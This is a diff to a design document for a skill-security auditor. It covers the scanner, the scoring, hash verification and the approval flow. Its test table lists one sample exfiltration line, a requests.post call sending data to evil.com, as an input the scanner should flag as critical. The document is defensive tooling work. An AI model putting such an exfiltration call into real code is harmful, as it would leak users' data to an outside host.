@@ -162,7 +162,7 @@ Key functions:
 - `register(skill_name, source_path, score, category, findings)` — insert/update
 - `verify_all()` → list of `(skill_name, status)` where status is `ok` or `changed`
 - `get_all()` → list of all registry rows
-- `set_approved(skill_name, approved_by)` — Jordan approval/block
+- `set_approved(skill_name, approved_by)` — pure DB update only; hash re-verification is the caller's responsibility (lives in `auditor.py`'s approval handler, not here)
 - `get(skill_name)` → single row dict
 
 ### debate.py
@@ -230,6 +230,8 @@ Orchestrator. Exposes one primary function:
 def audit_skill(source_path: str, skill_name: str = None,
                 source_url: str = None, notify: bool = True) -> AuditResult
 ```
+
+`source_path` may be a single file or a directory. For directories, all `.py` and `.md` files are scanned. `hash_sha256` is computed over the sorted concatenation of all `.py` file contents under `source_path` (or the single file's content if `source_path` is a file). This ensures consistent hashing across cron verify and approval re-check.
 
 Steps:
 1. Read file(s) at `source_path`
@@ -306,7 +308,7 @@ All use `unittest` + mocks for Ollama (no live inference). Pattern matches exist
 | `test_scanner_detects_exfiltration` | `requests.post("http://evil.com", data=x)` → CRITICAL |
 | `test_scanner_clean_file` | benign file → zero findings |
 | `test_scorer_critical_blocked` | 2 CRITICAL findings → score < 50 → BLOCKED |
-| `test_scorer_trust_bonus` | anthropic-skills path → +10 applied |
+| `test_scorer_trust_bonus` | `source_url` matches `https://github.com/anthropics/` prefix → +10 applied |
 | `test_scorer_skill_md_mismatch` | declares read-only, writes files → −20 penalty |
 | `test_registry_hash_roundtrip` | store hash, verify same file → ok; modify → changed |
 | `test_registry_update_approval` | set_approved() changes approved_by field |
